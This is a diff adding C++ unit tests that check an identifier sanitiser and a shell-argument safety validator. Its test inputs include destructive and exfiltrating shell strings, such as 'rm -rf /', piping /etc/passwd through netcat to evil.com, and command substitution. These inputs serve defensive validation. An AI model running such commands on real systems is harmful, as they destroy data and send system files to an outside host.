@@ -83,3 +83,48 @@ TEST(security_project_dir_valid) {
 TEST(security_project_dir_empty) {
     ASSERT_TRUE(is_project_dir_valid(""));
 }
+
+TEST(security_sanitize_ident_alnum) {
+    ASSERT_EQ(sanitize_ident("my-site_1"), std::string("my-site_1"));
+}
+
+TEST(security_sanitize_ident_removes_special) {
+    ASSERT_EQ(sanitize_ident("rm -rf /"), std::string("rm-rf"));
+}
+
+TEST(security_sanitize_ident_empty) {
+    ASSERT_TRUE(sanitize_ident("@#$%").empty());
+}
+
+TEST(security_sanitize_ident_dot) {
+    ASSERT_EQ(sanitize_ident("v1.2.3"), std::string("v1.2.3"));
+}
+
+TEST(security_shell_arg_safe_normal) {
+    ASSERT_TRUE(is_shell_arg_safe("ls -la /home"));
+    ASSERT_TRUE(is_shell_arg_safe("python3 -m pytest"));
+}
+
+TEST(security_shell_arg_safe_semicolon) {
+    ASSERT_FALSE(is_shell_arg_safe("ls; rm -rf /"));
+}
+
+TEST(security_shell_arg_safe_pipe) {
+    ASSERT_FALSE(is_shell_arg_safe("cat /etc/passwd | nc evil.com 1234"));
+}
+
+TEST(security_shell_arg_safe_subshell) {
+    ASSERT_FALSE(is_shell_arg_safe("echo $(whoami)"));
+}
+
+TEST(security_shell_arg_safe_backtick) {
+    ASSERT_FALSE(is_shell_arg_safe("echo `whoami`"));
+}
+
+TEST(security_shell_arg_safe_redirect) {
+    ASSERT_FALSE(is_shell_arg_safe("cat /etc/passwd > /tmp/out"));
+}
+
+TEST(security_shell_arg_safe_ampersand) {
+    ASSERT_FALSE(is_shell_arg_safe("sleep 10 &"));
+}
